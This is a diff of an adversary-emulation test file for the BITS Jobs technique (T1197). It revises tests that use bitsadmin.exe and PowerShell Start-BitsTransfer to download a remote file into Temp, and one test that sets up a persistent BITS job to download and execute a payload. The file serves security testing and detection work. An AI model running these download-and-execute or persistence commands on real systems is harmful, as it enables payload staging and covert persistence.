@@ -3,7 +3,8 @@ attack_technique: T1197
 display_name: BITS Jobs
 
 atomic_tests:
-- name: Download & Execute
+- name: Bitsadmin Download (cmd)
+  auto_generated_guid: 3c73d728-75fb-4180-a12f-6712864d7421
   description: |
     This test simulates an adversary leveraging bitsadmin.exe to download
     and execute a payload
@@ -18,15 +19,21 @@ atomic_tests:
     local_file:
       description: Local file path to save downloaded file
       type: path
-      default: C:\Windows\Temp\bitsadmin_flag.ps1
+      default: "%temp%\\bitsadmin_flag.ps1"
   executor:
     name: command_prompt
     command: |
-      bitsadmin.exe  /transfer /Download /priority Foreground #{remote_file} #{local_file}
-- name: Download & Execute via PowerShell BITS
+      bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
+    cleanup_command: |
+      del #{local_file} >nul 2>&1
+
+- name: Bitsadmin Download (PowerShell)
+  auto_generated_guid: f63b8bc4-07e5-4112-acba-56f646f3f0bc
   description: |
     This test simulates an adversary leveraging bitsadmin.exe to download
     and execute a payload leveraging PowerShell
+
+    Upon execution you will find a github markdown file downloaded to the Temp directory
   supported_platforms:
     - windows
   input_arguments:
@@ -37,13 +44,16 @@ atomic_tests:
     local_file:
       description: Local file path to save downloaded file
       type: path
-      default: C:\Windows\Temp\bitsadmin_flag.ps1
+      default: "$env:TEMP\\bitsadmin_flag.ps1"
   executor:
     name: powershell
     command: |
       Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
+    cleanup_command: |
+      Remove-Item #{local_file} -ErrorAction Ignore
 
 - name: Persist, Download, & Execute
+  auto_generated_guid: 62a06ec5-5754-47d2-bcfc-123d8314c6ae
   description: |
     This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer
     and execute a payload in multiple steps. This job will remain in the BITS queue for 90 days by default if not removed.
@@ -61,7 +71,7 @@ atomic_tests:
     local_file:
       description: Local file path to save downloaded file
       type: path
-      default: C:\Windows\Temp\bitsadmin_flag.ps1
+      default: "%temp%\\bitsadmin_flag.ps1"
     command_path:
       description: Path of command to execute
       type: path
@@ -69,7 +79,7 @@ atomic_tests:
     command_line:
       description: Command line to execute
       type: string
-      default: C:\Windows\Temp\bitsadmin_flag.ps1
+      default: "%temp%\\bitsadmin_flag.ps1"
   executor:
     name: command_prompt
     command: |
